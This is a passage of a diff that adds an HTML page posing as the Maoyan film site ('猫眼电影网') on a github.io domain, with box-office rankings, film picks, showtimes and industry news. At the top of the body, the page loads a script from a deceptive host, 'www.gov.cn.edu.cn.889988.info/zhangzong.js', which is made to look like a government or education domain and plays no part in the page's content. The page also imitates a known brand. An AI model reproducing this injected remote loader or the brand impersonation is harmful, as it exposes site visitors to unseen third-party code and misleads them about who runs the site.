@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>猫眼电影网｜在线选座购票、实时票房与影评社区 — maoyandianyingwang-zh.github.io</title>
+<meta name="keywords" content="猫眼电影网, maoyandianyingwang-zh.github.io, 在线电影票, 院线实时票房, 2026热映新片, 影评, 排片查询, 导演访谈, 暑期档, 票房榜">
+<meta name="description" content="猫眼电影网 maoyandianyingwang-zh.github.io 是聚焦院线新片与观影决策的独立电影媒体，每日更新热映票房榜、导演深度访谈、排片场次与专业影评。在这里发现值得走进影院的那一部，从看电影到懂电影。">
+<meta name="robots" content="index,follow">
+<meta name="author" content="猫眼电影网">
+<meta name="copyright" content="猫眼电影网 maoyandianyingwang-zh.github.io">
+<meta name="theme-color" content="#10131c">
+<meta property="og:type" content="website">
+<meta property="og:title" content="猫眼电影网｜在线选座购票、实时票房与影评社区">
+<meta property="og:description" content="聚焦院线新片与观影决策的独立电影媒体，每日更新热映票房榜、导演深度访谈、排片场次与专业影评。">
+<meta property="og:url" content="https://maoyandianyingwang-zh.github.io">
+<meta property="og:site_name" content="猫眼电影网">
+<link rel="canonical" href="https://maoyandianyingwang-zh.github.io/">
+<style>
+:root{
+  --ink:#10131c; --ink2:#171a26; --card:#1c2030; --card2:#232838;
+  --line:rgba(255,255,255,.08); --txt:#e9ebf2; --txt2:#a8adbd; --txt3:#7a8094;
+  --gold:#e7b864; --gold2:#f4d99a; --pop:#ff4d5e; --cyan:#4fd1d9;
+  --shadow:0 24px 60px -28px rgba(0,0,0,.85);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif;
+  background:var(--ink); color:var(--txt); line-height:1.75; overflow-x:hidden;
+  background-image:radial-gradient(1100px 620px at 82% -8%,rgba(231,184,100,.14),transparent 60%),
+    radial-gradient(900px 540px at -6% 12%,rgba(79,209,217,.10),transparent 62%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ===== 顶部 ===== */
+.topbar{
+  position:sticky;top:0;z-index:60;background:rgba(13,16,24,.82);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;gap:22px;height:62px}
+.logo{display:flex;align-items:baseline;gap:9px;flex-shrink:0}
+.logo b{font-size:20px;letter-spacing:.5px;font-weight:800;color:#fff}
+.logo b i{font-style:normal;color:var(--gold)}
+.logo span{font-size:11px;color:var(--txt3);letter-spacing:1.4px;text-transform:uppercase;border-left:1px solid var(--line);padding-left:9px}
+.nav{display:flex;gap:4px;margin-left:auto;align-items:center}
+.nav a{
+  font-size:14.5px;color:var(--txt2);padding:7px 13px;border-radius:9px;transition:.22s;white-space:nowrap;
+}
+.nav a:hover{color:#fff;background:rgba(255,255,255,.06)}
+.nav a em{font-style:normal;color:var(--gold);font-weight:700}
+.menu-btn{display:none;margin-left:auto;width:42px;height:42px;border:1px solid var(--line);border-radius:10px;background:transparent;color:#fff;font-size:20px;cursor:pointer}
+
+/* ===== 通用区块 ===== */
+section{padding:86px 0;position:relative}
+.kicker{display:inline-flex;align-items:center;gap:8px;font-size:12px;letter-spacing:2.6px;color:var(--gold);text-transform:uppercase;margin-bottom:14px}
+.kicker::before{content:"";width:26px;height:2px;background:var(--gold);border-radius:2px}
+.h2{font-size:clamp(26px,4vw,40px);font-weight:800;letter-spacing:.4px;line-height:1.28;margin-bottom:12px}
+.h2 small{display:block;font-size:15px;font-weight:400;color:var(--txt3);letter-spacing:0;margin-top:10px;max-width:640px;line-height:1.7}
+.lead{color:var(--txt2);max-width:700px;font-size:16px}
+.link{display:inline-flex;align-items:center;gap:7px;color:var(--gold);font-size:14.5px;font-weight:600;margin-top:18px;border-bottom:1px solid transparent;padding-bottom:2px}
+.link:hover{border-color:var(--gold)}
+
+/* ===== Hero ===== */
+.hero{position:relative;min-height:88vh;display:flex;align-items:center;padding:100px 0 70px;overflow:hidden}
+.hero .bg{position:absolute;inset:0;background-image:url("https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=1800&q=80");
+  background-size:cover;background-position:center;opacity:.34}
+.hero .bg::after{content:"";position:absolute;inset:0;background:linear-gradient(100deg,rgba(10,12,18,.96) 0%,rgba(10,12,18,.86) 46%,rgba(10,12,18,.35) 100%)}
+.hero .wrap{position:relative;z-index:2;width:100%}
+.hero .tag{display:inline-block;font-size:12px;letter-spacing:2px;color:var(--gold);border:1px solid rgba(231,184,100,.35);border-radius:40px;padding:6px 15px;margin-bottom:22px}
+.hero h1{font-size:clamp(34px,6.4vw,70px);font-weight:900;line-height:1.12;letter-spacing:-.5px}
+.hero h1 .hl{background:linear-gradient(92deg,var(--gold),var(--pop));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{font-size:clamp(15px,1.7vw,18.5px);color:#cdd2e0;max-width:600px;margin:22px 0 30px}
+.hero .acts{display:flex;gap:14px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:14px 27px;border-radius:12px;font-size:15px;font-weight:700;transition:.24s;border:1px solid transparent;cursor:pointer}
+.btn-main{background:linear-gradient(96deg,var(--gold),var(--pop));color:#17110c;box-shadow:0 14px 34px -14px rgba(255,77,94,.7)}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 22px 44px -16px rgba(255,77,94,.75)}
+.btn-ghost{color:#fff;border-color:rgba(255,255,255,.22)}
+.btn-ghost:hover{border-color:var(--gold);color:var(--gold2)}
+.hero-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;margin-top:52px;background:var(--line);border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.hero-stats div{background:rgba(20,23,34,.9);padding:20px 18px}
+.hero-stats b{display:block;font-size:clamp(20px,3vw,29px);font-weight:800;color:#fff}
+.hero-stats b i{font-style:normal;color:var(--gold);font-size:.66em}
+.hero-stats span{font-size:12.5px;color:var(--txt3);letter-spacing:.4px}
+
+/* ===== 栏目一 热映榜单 ===== */
+.board{display:grid;grid-template-columns:1.02fr .98fr;gap:34px;align-items:start}
+.board .list{border:1px solid var(--line);border-radius:18px;overflow:hidden;background:linear-gradient(180deg,rgba(255,255,255,.035),rgba(255,255,255,.01))}
+.row{display:grid;grid-template-columns:44px 76px 1fr auto;align-items:center;gap:16px;padding:15px 20px;border-bottom:1px solid var(--line)}
+.row:last-child{border-bottom:0}
+.row .no{font-size:22px;font-weight:900;color:rgba(255,255,255,.16);font-style:italic}
+.row .no.top{color:var(--gold)}
+.row .post{width:76px;height:104px;border-radius:8px;background-size:cover;background-position:center;position:relative;flex-shrink:0}
+.row .post span{position:absolute;right:-6px;bottom:-6px;background:var(--pop);color:#fff;font-size:11px;font-weight:700;padding:2px 7px;border-radius:20px}
+.row h4{font-size:16px;font-weight:700;line-height:1.35}
+.row h4 em{display:block;font-style:normal;font-size:12.5px;color:var(--txt3);font-weight:400;margin-top:5px}
+.row .box{text-align:right;flex-shrink:0}
+.row .box b{display:block;font-size:17px;font-weight:800;color:var(--gold2)}
+.row .box span{font-size:11.5px;color:var(--txt3)}
+.board-aside{border:1px solid var(--line);border-radius:18px;padding:26px;background:linear-gradient(165deg,rgba(231,184,100,.10),rgba(255,255,255,.02))}
+.board-aside h3{font-size:19px;margin-bottom:6px}
+.board-aside > p{font-size:13.5px;color:var(--txt3);margin-bottom:20px}
+.trend{display:flex;align-items:flex-end;gap:11px;height:128px;padding:14px 4px 0;border-bottom:1px solid var(--line)}
+.trend i{width:100%;background:linear-gradient(180deg,var(--gold),rgba(231,184,100,.18));border-radius:5px 5px 0 0;position:relative;transition:.4s}
+.trend i:hover{filter:brightness(1.18)}
+.trend i b{position:absolute;top:-22px;left:50%;transform:translateX(-50%);font-size:11.5px;color:var(--gold2);white-space:nowrap;font-style:normal;font-weight:700}
+.trend i u{position:absolute;bottom:7px;left:0;right:0;text-align:center;text-decoration:none;font-size:11px;color:#1a1308;font-weight:700}
+.trend-labels{display:flex;gap:11px;padding-top:9px;font-size:11.5px;color:var(--txt3)}
+.trend-labels span{flex:1;text-align:center}
+
+/* ===== 栏目二 票根指南 ===== */
+.guide-head{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;margin-bottom:34px}
+.guide{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.ticket{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--card);transition:.3s;position:relative}
+.ticket:hover{transform:translateY(-6px);border-color:rgba(231,184,100,.4);box-shadow:var(--shadow)}
+.ticket .cvr{height:190px;background-size:cover;background-position:center;position:relative}
+.ticket .cvr::after{content:"";position:absolute;left:0;right:0;bottom:0;height:64%;background:linear-gradient(0deg,rgba(14,17,25,.95),transparent)}
+.ticket .cvr b{position:absolute;left:16px;bottom:13px;font-size:18px;font-weight:800;z-index:2;letter-spacing:.3px}
+.ticket .cvr u{position:absolute;right:14px;top:14px;text-decoration:none;background:rgba(10,12,18,.72);color:var(--gold);font-size:11.5px;padding:4px 10px;border-radius:20px;z-index:2}
+.ticket .body{padding:18px 20px 22px}
+.ticket .body p{font-size:14px;color:var(--txt2);min-height:74px}
+.ticket .meta{display:flex;justify-content:space-between;font-size:12.5px;color:var(--txt3);border-top:1px dashed var(--line);margin-top:14px;padding-top:12px}
+
+/* ===== 栏目三 深度长文 ===== */
+.split{display:grid;grid-template-columns:1.15fr .85fr;gap:30px;align-items:start}
+.feature{border:1px solid var(--line);border-radius:18px;overflow:hidden;background:var(--card)}
+.feature .ph{height:300px;background-image:url("https://images.unsplash.com/photo-1604975701397-6365ccbd028a?auto=format&fit=crop&w=1400&q=80");background-size:cover;background-position:center;position:relative}
+.feature .ph span{position:absolute;left:22px;bottom:18px;background:var(--pop);color:#fff;font-size:12px;font-weight:700;padding:5px 12px;border-radius:6px;letter-spacing:1px}
+.feature .inner{padding:28px 30px 32px}
+.feature .inner .stamp{display:flex;gap:18px;font-size:12.5px;color:var(--txt3);margin-bottom:14px}
+.feature .inner .stamp i{font-style:normal;color:var(--gold)}
+.feature h3{font-size:26px;font-weight:800;line-height:1.4;margin-bottom:14px;letter-spacing:.3px}
+.feature p{color:var(--txt2);font-size:15px;margin-bottom:12px}
+.pull{margin:20px 0;padding:18px 22px;border-left:3px solid var(--gold);background:rgba(231,184,100,.07);border-radius:0 10px 10px 0;font-size:15.5px;color:var(--gold2);font-style:italic}
+.aside{display:flex;flex-direction:column;gap:18px}
+.qa{border:1px solid var(--line);border-radius:14px;padding:20px 22px;background:var(--card)}
+.qa h5{font-size:15px;color:var(--gold);margin-bottom:6px;letter-spacing:.3px}
+.qa p{font-size:14px;color:var(--txt2)}
+.qa + .qa{border-top:0}
+
+/* ===== 栏目四 排片时刻 ===== */
+.schedule{border:1px solid var(--line);border-radius:18px;overflow:hidden}
+.schedule .tabs{display:flex;gap:6px;padding:16px 20px;border-bottom:1px solid var(--line);flex-wrap:wrap;background:rgba(255,255,255,.02)}
+.schedule .tabs a{padding:7px 15px;border-radius:8px;font-size:14px;color:var(--txt2);border:1px solid var(--line)}
+.schedule .tabs a.on{background:var(--gold);color:#1a1308;border-color:var(--gold);font-weight:700}
+table{width:100%;border-collapse:collapse}
+th,td{padding:15px 20px;text-align:left;font-size:14.5px;border-bottom:1px solid var(--line)}
+th{font-size:12px;letter-spacing:1.4px;color:var(--txt3);font-weight:600;background:rgba(255,255,255,.025)}
+td.name strong{font-weight:700;font-size:16px}
+td.name em{display:block;font-style:normal;font-size:12px;color:var(--txt3);margin-top:3px}
+td.price b{color:var(--gold2);font-size:16px;font-weight:800}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chips a{font-size:12.5px;padding:5px 12px;border:1px solid var(--line);border-radius:6px;color:var(--txt2)}
+.chips a:hover{color:var(--gold);border-color:var(--gold)}
+.more{padding:16px 20px;text-align:center;background:rgba(231,184,100,.05)}
+.more a{color:var(--gold);font-size:14px;font-weight:600}
+
+/* ===== 栏目五 行业观察 ===== */
+.observe{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.observe article{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--card);transition:.28s}
+.observe article:hover{transform:translateY(-5px);box-shadow:var(--shadow)}
+.observe .ph{height:150px;background-size:cover;background-position:center}
+.observe .txt{padding:18px 20px 22px}
+.observe time{font-size:11.5px;color:var(--gold);letter-spacing:1.2px}
+.observe h4{font-size:16.5px;font-weight:700;margin:8px 0 9px;line-height:1.45}
+.observe p{font-size:13.5px;color:var(--txt3)}
+
+/* ===== 栏目六 编辑部 ===== */
+.crew{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.person{border:1px solid var(--line);border-radius:16px;padding:24px;background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.01))}
+.person .top{display:flex;align-items:center;gap:15px;margin-bottom:15px}
+.av{width:54px;height:54px;border-radius:50%;background-size:cover;background-position:center;border:2px solid var(--gold);flex-shrink:0}
+.person h5{font-size:16px}
+.person h5 em{display:block;font-style:normal;font-size:12px;color:var(--txt3);font-weight:400;margin-top:2px}
+.person blockquote{font-size:14px;color:var(--txt2);border-left:2px solid var(--line);padding-left:14px;line-height:1.8}
+
+/* ===== CTA ===== */
+.cta{border:1px solid rgba(231,184,100,.28);border-radius:22px;padding:52px 46px;text-align:center;background:
+  radial-gradient(800px 300px at 50% -40%,rgba(231,184,100,.18),transparent),
+  linear-gradient(155deg,rgba(255,255,255,.05),rgba(255,255,255,.01))}
+.cta h3{font-size:clamp(24px,3.6vw,35px);font-weight:800;margin-bottom:12px}
+.cta p{color:var(--txt2);max-width:560px;margin:0 auto 26px;font-size:15.5px}
+.cta .acts{justify-content:center}
+.urlbox{display:inline-flex;align-items:center;gap:12px;margin-top:26px;background:rgba(0,0,0,.32);border:1px solid var(--line);border-radius:12px;padding:12px 20px;font-size:14px;color:var(--gold2);letter-spacing:.3px}
+.urlbox code{font-family:ui-monospace,Menlo,Consolas,monospace;color:#fff;font-size:15px}
+
+/* ===== Footer ===== */
+footer{border-top:1px solid var(--line);padding:52px 0 34px;background:#0c0e15}
+.foot{display:grid;grid-template-columns:1.3fr 1fr 1fr 1fr;gap:34px}
+.foot h6{font-size:13px;letter-spacing:1.6px;color:var(--gold);margin-bottom:15px;text-transform:uppercase}
+.foot ul{list-style:none;display:flex;flex-direction:column;gap:9px}
+.foot a{color:var(--txt3);font-size:14px}
+.foot a:hover{color:var(--gold2)}
+.foot .brand p{color:var(--txt3);font-size:13.5px;margin:12px 0 16px;max-width:300px}
+.legal{margin-top:38px;padding-top:22px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:12.5px;color:var(--txt3)}
+.legal b{color:var(--gold2);font-weight:700}
+
+/* ===== 响应式 ===== */
+@media(max-width:960px){
+  section{padding:62px 0}
+  .board{grid-template-columns:1fr}
+  .guide{grid-template-columns:repeat(2,1fr)}
+  .split{grid-template-columns:1fr}
+  .observe{grid-template-columns:repeat(2,1fr)}
+  .crew{grid-template-columns:1fr}
+  .hero-stats{grid-template-columns:repeat(2,1fr)}
+  .foot{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:720px){
+  .wrap{padding:0 17px}
+  .topbar .wrap{height:56px}
+  .logo span{display:none}
+  .menu-btn{display:block}
+  .nav{position:fixed;top:56px;left:0;right:0;flex-direction:column;gap:2px;align-items:stretch;
+    background:rgba(11,14,21,.98);border-bottom:1px solid var(--line);padding:14px 17px;
+    max-height:0;overflow:hidden;transition:.3s;margin:0}
+  .nav.open{max-height:420px}
+  .nav a{padding:12px 14px;border-radius:8px}
+  .hero{padding:66px 0 44px;min-height:auto}
+  .hero-stats{grid-template-columns:1fr 1fr}
+  .row{grid-template-columns:34px 60px 1fr;gap:12px;padding:13px 15px}
+  .row .box{display:none}
+  .row .post{width:60px;height:84px}
+  .guide{grid-template-columns:1fr}
+  .observe{grid-template-columns:1fr}
+  .observe article:not(:first-child){display:none}
+  .feature .ph{height:200px}
+  .feature .inner{padding:22px 20px 26px}
+  .feature h3{font-size:21px}
+  .trend{height:104px}
+  th,td{padding:12px 14px;font-size:13.5px}
+  .cta{padding:36px 22px;border-radius:16px}
+  .urlbox{display:block;text-align:left}
+  .urlbox code{display:block;margin-top:7px;word-break:break-all}
+  .foot{grid-template-columns:1fr}
+  .legal{flex-direction:column}
+  table{font-size:13px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="logo" href="#top" aria-label="猫眼电影网首页"><b>猫眼<i>电影</i>网</b><span>Maoyan Film · 观影决策指南</span></a>
+    <button class="menu-btn" id="mBtn" aria-label="菜单">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#board">热映票房</a>
+      <a href="#guide">选片指南</a>
+      <a href="#feature">深度影评</a>
+      <a href="#show">排片场次</a>
+      <a href="#news">行业观察</a>
+      <a href="#crew">编辑部</a>
+      <a href="#about"><em>访问本站</em></a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="bg" aria-hidden="true"></div>
+  <div class="wrap">
+    <span class="tag">2026 院线新片 · 每日更新</span>
+    <h1>从<em class="hl">看电影</em>，到<br>每一次都选对那一部</h1>
+    <p>猫眼电影网 maoyandianyingwang-zh.github.io 聚合全国院线热映新片的实时票房、排片场次与专业影评，帮你把两小时的观影时间，留给真正值得的那一场。</p>
+    <div class="acts">
+      <a class="btn btn-main" href="#board">查看今日票房榜 →</a>
+      <a class="btn btn-ghost" href="#guide">选片指南</a>
+    </div>
+    <div class="hero-stats">
+      <div><b>250<i>亿+</i></b><span>2026 年度总票房</span></div>
+      <div><b>3000<i>家+</i></b><span>覆盖城市影院</span></div>
+      <div><b>35<i>天</i></b><span>暑期档单日过亿</span></div>
+      <div><b>9.7<i>分</i></b><span>猫眼动画最高评分</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一 -->
+<section id="board">
+  <div class="wrap">
+    <div class="kicker">Box Office</div>
+    <div class="board">
+      <div>
+        <h2 class="h2">今日热映票房榜<small>综合票房 · 票房占比 · 排片场次 · 上座率，一眼看清哪部正在逆袭</small></h2>
+        <div class="list">
+          <div class="row"><div class="no top">01</div><div class="post" style="background-image:url('https://images.unsplash.com/photo-1635805737707-575885ab0820?auto=format&fit=crop&w=300&q=70')"><span>预售</span></div><div><h4>蜘蛛侠：崭新之日<em>动作 / 科幻 · 汤姆·霍兰德 · 赞达亚</em></h4></div><div class="box"><b>13.2亿</b><span>上映 14 天</span></div></div>
+          <div class="row"><div class="no top">02</div><div class="post" style="background-image:url('https://images.unsplash.com/photo-1574267432553-4b4628081c31?auto=format&fit=crop&w=300&q=70')"><span>9.7</span></div><div><h4>八仙！<em>动画 · 国风神话改编 · 陈浩 / 李绍哲</em></h4></div><div class="box"><b>13.0亿</b><span>上映 33 天</span></div></div>
+          <div class="row"><div class="no top">03</div><div class="post" style="background-image:url('https://images.unsplash.com/photo-1485846234645-a62644f84728?auto=format&fit=crop&w=300&q=70')"><span>9.7</span></div><div><h4>欢迎来龙餐馆<em>剧情 · 沈腾 / 蒋奇明</em></h4></div><div class="box"><b>7.4亿</b><span>上映 8 天</span></div></div>
+          <div class="row"><div class="no">04</div><div class="post" style="background-image:url('https://images.unsplash.com/photo-1598899134739-24c46f58b8c0?auto=format&fit=crop&w=300&q=70')"><span>9.5</span></div><div><h4>功夫女足<em>喜剧 · 张小斐 / 迪丽热巴</em></h4></div><div class="box"><b>30.1亿</b><span>上映 60 天</span></div></div>
+          <div class="row"><div class="no">05</div><div class="post" style="background-image:url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?auto=format&fit=crop&w=300&q=70')"><span>9.5</span></div><div><h4>奥德赛<em>史诗 · 马特·达蒙 / 诺兰</em></h4></div><div class="box"><b>3.6亿</b><span>上映 3 天</span></div></div>
+          <div class="row"><div class="no">06</div><div class="post" style="background-image:url('https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?auto=format&fit=crop&w=300&q=70')"><span>9.0</span></div><div><h4>痴迷<em>心理惊悚 · 迈克尔·约翰斯顿</em></h4></div><div class="box"><b>1.9亿</b><span>上映 25 天</span></div></div>
+        </div>
+        <a class="link" href="#show">查看完整排片场次与余票 →</a>
+      </div>
+      <aside class="board-aside">
+        <h3>暑期档大盘走势</h3>
+        <p>总票房已破 75 亿，国产喜剧与国风动画领跑</p>
+        <div class="trend">
+          <i style="height:34%"><b>7/11</b><u>38.6</u></i>
+          <i style="height:52%"><b>7/18</b><u>52.1</u></i>
+          <i style="height:70%"><b>7/25</b><u>63.8</u></i>
+          <i style="height:86%"><b>8/01</b><u>75.4</u></i>
+          <i style="height:100%"><b>8/07</b><u>82.9</u></i>
+        </div>
+        <div class="trend-labels"><span>功夫女足</span><span>八仙！</span><span>去你的岛</span><span>欢迎来龙餐馆</span><span>蜘蛛侠</span></div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二 -->
+<section id="guide" style="background:linear-gradient(180deg,rgba(255,255,255,.02),transparent)">
+  <div class="wrap">
+    <div class="guide-head">
+      <div>
+        <div class="kicker">Curator's Pick</div>
+        <h2 class="h2">编辑部本周选片<small>每周从类型、口碑、适配人群三个维度筛出值得买票的四部，省掉你在片单里反复横跳的时间</small></h2>
+      </div>
+      <a class="link" href="#feature">全部片单与深度影评 →</a>
+    </div>
+    <div class="guide">
+      <article class="ticket">
+        <div class="cvr" style="background-image:url('https://images.unsplash.com/photo-1542204165-65bf26472b9b?auto=format&fit=crop&w=800&q=70')"><u>热映中</u><b>逆光追风</b></div>
+        <div class="body"><p>动作场面密度极高，IMAX 厅的音效设计是全片最值得回票价的部分，追求视听刺激优先选它。</p>
+          <div class="meta"><span>动作 / 2h12m</span><span>猫眼 9.2</span></div></div>
+      </article>
+      <article class="ticket">
+        <div class="cvr" style="background-image:url('https://images.unsplash.com/photo-1518929458119-e5bf444c30f4?auto=format&fit=crop&w=800&q=70')"><u>口碑黑马</u><b>去你的岛</b></div>
+        <div class="body"><p>前半段像奇幻冒险，后半段品出双向救赎，纯爱观众大概率会在最后十分钟落泪。</p>
+          <div class="meta"><span>爱情 / 1h58m</span><span>猫眼 9.4</span></div></div>
+      </article>
+      <article class="ticket">
+        <div class="cvr" style="background-image:url('https://images.unsplash.com/photo-1478720568477-152d9b164e26?auto=format&fit=crop&w=800&q=70')"><u>二刷首选</u><b>八仙！</b></div>
+        <div class="body"><p>青绿山水还原蓬莱仙境，群像塑造丰满，二刷时彩蛋的完成度比首刷高出一个档次。</p>
+          <div class="meta"><span>动画 / 2h05m</span><span>猫眼 9.7</span></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三 -->
+<section id="feature">
+  <div class="wrap">
+    <div class="kicker">Long Read</div>
+    <div class="split">
+      <article class="feature">
+        <div class="ph" aria-hidden="true"></div>
+        <div class="inner">
+          <div class="stamp"><span>封面报道</span><span>2026.08.14</span><i>阅读约 8 分钟</i></div>
+          <h3>200 亿之后，观众凭什么重新走进电影院？</h3>
+          <p>7 月 19 日，2026 年中国电影年度总票房迈过 200 亿元，近 300 部影片在档期里轮番登场。真正让人好奇的不是这个数字，而是它背后的选择机制——当流媒体已经足够方便，是什么让观众愿意为一张电影票走出门。</p>
+          <p>从《功夫女足》到《八仙！》，从《镖人：风起大漠》到《惊蛰无声》，爆款之间几乎找不到共同的配方。唯一能确定的是，观众开始拒绝「统一配方」，转而追逐有自己口味的作品。</p>
+          <div class="pull">「优质影片内容叠加观影消费补贴，才真正把观众重新拉回了影院。」——电影市场分析师观点</div>
+          <p>全年预计投放不少于 12 亿元惠民观影补贴，北京、浙江等地相继发放总额超 2000 万、2500 万元的观影消费券。票价的合理下调，是激活大众观影意愿最直接的那只手。</p>
+          <a class="link" href="#news">查看行业观察全部分类 →</a>
+        </div>
+      </article>
+      <aside class="aside">
+        <div class="qa"><h5>Q &nbsp;评分高的片子一定好看吗？</h5><p>不一定。评分反映的是共识，但你的口味是具体的——合家欢喜剧和作者向文艺片几乎没有可比性，先看类型再参考评分更靠谱。</p></div>
+        <div class="qa"><h5>Q &nbsp;首映日和点映该选哪个？</h5><p>点映口碑通常更接近真实评价，适合犹豫型观众；首映日氛围更强，适合追新片的仪式感需求。</p></div>
+        <div class="qa"><h5>Q &nbsp;怎样判断一部片值不值得二刷？</h5><p>看片尾是否有彩蛋名单、镜头语言是否复杂、群像戏是否有伏笔。细节密度高的片子，二刷回报率明显更高。</p></div>
+        <div class="qa"><h5>Q &nbsp;IMAX 和杜比影院怎么选？</h5><p>大场面视效片优先 IMAX，注重声音层次与暗部细节的文艺片优先杜比。别为每一部片子都加价。</p></div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四 -->
+<section id="show" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02))">
+  <div class="wrap">
+    <div class="kicker">Showtimes</div>
+    <h2 class="h2">排片场次与在线选座<small>覆盖主流影院排片、票价与余座情况，场次实时更新，支持按影厅格式筛选</small></h2>
+    <div class="schedule">
+      <div class="tabs">
+        <a class="on" href="#">08/14 周五</a><a href="#">08/15 周六</a><a href="#">08/16 周日</a><a href="#">08/17 周一</a><a href="#">后三天 ▾</a>
+      </div>
+      <table>
+        <thead><tr><th style="width:26%">影片</th><th style="width:24%">影院</th><th style="width:18%">影厅格式</th><th style="width:16%">场次</th><th style="width:16%">票价</th></tr></thead>
+        <tbody>
+          <tr><td class="name"><strong>蜘蛛侠：崭新之日</strong><em>2D / CINITY / IMAX</em></td><td>万达影城（江宁万达广场 IMAX 店）</td><td><span class="chips"><a href="#">IMAX</a><a href="#">CINITY</a></span></td><td>10:30 · 13:20 · 19:40</td><td class="price"><b>¥ 32.9</b> 起</td></tr>
+          <tr><td class="name"><strong>八仙！</strong><em>2D / 杜比全景声</em></td><td>幸福蓝海国际影城（江宁上元大街店）</td><td><span class="chips"><a href="#">杜比</a></span></td><td>11:05 · 14:50 · 18:10</td><td class="price"><b>¥ 23.0</b> 起</td></tr>
+          <tr><td class="name"><strong>欢迎来龙餐馆</strong><em>2D / 4K 激光</em></td><td>横店电影城（横影巨幕 S-PLUS 店）</td><td><span class="chips"><a href="#">巨幕</a><a href="#">4K</a></span></td><td>09:50 · 12:40 · 20:15</td><td class="price"><b>¥ 34.9</b> 起</td></tr>
+          <tr><td class="name"><strong>奥德赛</strong><em>IMAX 胶片摄影</em></td><td>南京星龙巨幕影城</td><td><span class="chips"><a href="#">IMAX</a><a href="#">激光</a></span></td><td>13:00 · 16:30 · 21:00</td><td class="price"><b>¥ 26.0</b> 起</td></tr>
+          <tr><td class="name"><strong>痴迷</strong><em>2D / 标准厅</em></td><td>幸福蓝海影城（滨河街区店）</td><td><span class="chips"><a href="#">标准</a></span></td><td>14:20 · 19:00 · 21:25</td><td class="price"><b>¥ 22.9</b> 起</td></tr>
+        </tbody>
+      </table>
+      <div class="more"><a href="#">查看全部影院与场次 →</a></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五 -->
+<section id="news">
+  <div class="wrap">
+    <div class="guide-head">
+      <div>
+        <div class="kicker">Industry Wire</div>
+        <h2 class="h2">行业观察<small>票房盘点、档期分析、导演访谈与宣发观察，把行业动态翻译成看得懂的话</small></h2>
+      </div>
+      <a class="link" href="#feature">阅读全部深度报道 →</a>
+    </div>
+    <div class="observe">
+      <article><div class="ph" style="background-image:url('https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?auto=format&fit=crop&w=700&q=70')"></div><div class="txt"><time>2026.08.20</time><h4>暑期档票房再创新高，国产片稳居前排</h4><p>多部国产大片表现亮眼，暑期档总票房创下近五年新高，市场活力持续释放。</p></div></article>
+      <article><div class="ph" style="background-image:url('https://images.unsplash.com/photo-1543536448-1e56c8d2d3c3?auto=format&fit=crop&w=700&q=70')"></div><div class="txt"><time>2026.08.14</time><h4>年度总票房突破 250 亿，下沉市场成基本盘</h4><p>广东、江苏、浙江三省持续领跑，三四线城市新建影院占比超七成。</p></div></article>
+      <article><div class="ph" style="background-image:url('https://images.unsplash.com/photo-1604975701397-6365ccbd028a?auto=format&fit=crop&w=700&q=70')"></div><div class="txt"><time>2026.08.06</time><h4>12 亿观影补贴落地，票价下调激活观影意愿</h4><p>北京、浙江、广东多地同步发放消费券，首单购票最高立减。</p></div></article>
+      <article><div class="ph" style="background-image:url('https://images.unsplash.com/photo-1478720568477-152d9b164e26?auto=format&fit=crop&w=700&q=70')"></div><div class="txt"><time>2026.07.27</time><h4>国风动画的票房天花板，被重新抬高了</h4><p>从神话改编到原创 IP，本土文化表达成为今年最明确的审美转向。</p></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六 -->
+<section id="crew" style="background:linear-gradient(180deg,rgba(255,255,255,.02),transparent)">
+  <div class="wrap">
+    <div class="kicker">The Desk</div>
+    <h2 class="h2">编辑部<small>一群把看电影当正经事的人，写你愿意读完的影评</small></h2>
+    <div class="crew">
